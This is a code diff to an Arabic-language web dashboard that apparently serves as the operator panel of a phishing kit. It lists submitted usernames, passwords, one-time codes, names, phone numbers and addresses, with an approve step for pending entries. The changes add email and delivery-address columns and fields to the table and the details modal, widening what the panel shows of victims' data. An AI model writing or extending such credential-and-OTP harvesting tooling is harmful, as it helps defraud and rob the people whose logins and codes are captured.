@@ -116,8 +116,8 @@
   }
   .logout-btn:hover{background:#f4f6f7;}
   .dash-body{
-    padding:20px;
-    max-width:900px;
+    padding:24px 20px 32px;
+    max-width:1400px;
     margin:0 auto;
   }
   .cards-grid{
@@ -227,7 +227,9 @@
     border-bottom:1px solid #eef1f2;
     text-align:right;
     color:var(--ink);
-    white-space:nowrap;
+    white-space:normal;
+    vertical-align:top;
+    max-width:220px;
   }
   table.requests tr:last-child td{border-bottom:none;}
   table.requests tr:hover td{background:#fafbfc;}
@@ -288,7 +290,7 @@
     background:#fff;
     border-radius:12px;
     width:100%;
-    max-width:340px;
+    max-width:520px;
     padding:22px 20px;
     box-shadow:0 12px 40px rgba(18,49,79,.25);
   }
@@ -456,6 +458,8 @@
               <th>كلمة المرور</th>
               <th>رقم الجوال</th>
               <th>الاسم</th>
+              <th>البريد</th>
+              <th>عنوان التوصيل</th>
               <th>الحالة</th>
               <th>الإجراءات</th>
             </tr>
@@ -482,6 +486,7 @@
       <div class="modal-row"><span class="k">OTP</span><span class="v" id="mOtp"></span></div>
       <div class="modal-row"><span class="k">الاسم</span><span class="v" id="mName"></span></div>
       <div class="modal-row"><span class="k">رقم الجوال</span><span class="v" id="mPhone"></span></div>
+      <div class="modal-row"><span class="k">البريد</span><span class="v" id="mEmail"></span></div>
       <div class="modal-row"><span class="k">عنوان التوصيل</span><span class="v" id="mAddress"></span></div>
       <div class="modal-actions">
         <button class="modal-approve" id="modalApproveBtn" type="button">
@@ -590,8 +595,10 @@
         row.innerHTML =
           '<td>' + escapeHtml(r.username) + '</td>' +
           '<td>••••••••</td>' +
-          '<td>' + escapeHtml(r.phone || '-') + '</td>' +
+          '<td>' + escapeHtml(r.phone || r.mobile || '-') + '</td>' +
           '<td>' + escapeHtml(r.name || '-') + '</td>' +
+          '<td>' + escapeHtml(r.email || '-') + '</td>' +
+          '<td>' + escapeHtml(r.address || '-') + '</td>' +
           '<td><span class="status-badge ' + st.cls + '">' + st.text + '</span></td>' +
           '<td><div class="row-actions">' +
             '<button type="button" class="details-btn">التفاصيل</button>' +
@@ -691,7 +698,8 @@
       document.getElementById('mPassword').textContent = r.password || '-';
       document.getElementById('mOtp').textContent = r.otp || '-';
       document.getElementById('mName').textContent = r.name || '-';
-      document.getElementById('mPhone').textContent = r.phone || '-';
+      document.getElementById('mPhone').textContent = r.phone || r.mobile || '-';
+      document.getElementById('mEmail').textContent = r.email || '-';
       document.getElementById('mAddress').textContent = r.address || '-';
       var isPending = r.status === 'pending' || !r.status;
       modalApproveBtn.classList.toggle('active', isPending);
